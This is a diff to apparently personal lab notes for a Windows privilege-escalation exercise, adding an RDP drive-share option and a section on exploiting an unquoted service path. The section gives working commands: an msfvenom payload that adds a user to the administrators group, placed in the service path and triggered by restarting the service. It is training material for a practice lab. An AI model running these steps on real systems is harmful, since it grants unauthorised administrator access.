@@ -7,7 +7,7 @@
 **Kali**
 
 ```
-xfreerdp +clipboard /u:user /p:password321 /cert:ignore /v:$VICTIM /size:1024x568
+xfreerdp +clipboard /u:user /p:password321 /cert:ignore /v:$VICTIM /size:1024x568 /drive:kali,/root/
 ```
 
 ### Answer the questions
@@ -860,9 +860,64 @@ net localgroup administrators
 
 <figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
+## Service Escalation - Unquoted Service Paths
 
+### Detection 
 
+**Windows VM**
 
+1\. Open command prompt and type: sc qc unquotedsvc
+
+**Victim**
+
+```
+sc qc unquotedsvc
+```
+
+2\. Notice that the “BINARY\_PATH\_NAME” field displays a path that is not confined between quotes.
+
+<figure><img src="../../.gitbook/assets/image (1253).png" alt=""><figcaption></figcaption></figure>
+
+### Exploitation
+
+**Kali VM**
+
+1\. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+
+**Kali**
+
+```
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+```
+
+2\. Copy the generated file, common.exe, to the Windows VM.
+
+**Victim**
+
+```
+copy \\tsclient\kali\common.exe  "C:\Program Files\Unquoted Path Service\common.exe"
+```
+
+**Windows VM**
+
+1\. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.\
+2\. Open command prompt and type: sc start unquotedsvc
+
+**Victim**
+
+```
+sc start unquotedsvc
+```
+
+3\. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
+
+**Victim**
+
+```
+net localgroup administrators
+```
+
+<figure><img src="../../.gitbook/assets/image (1254).png" alt=""><figcaption></figcaption></figure>
 
 
 
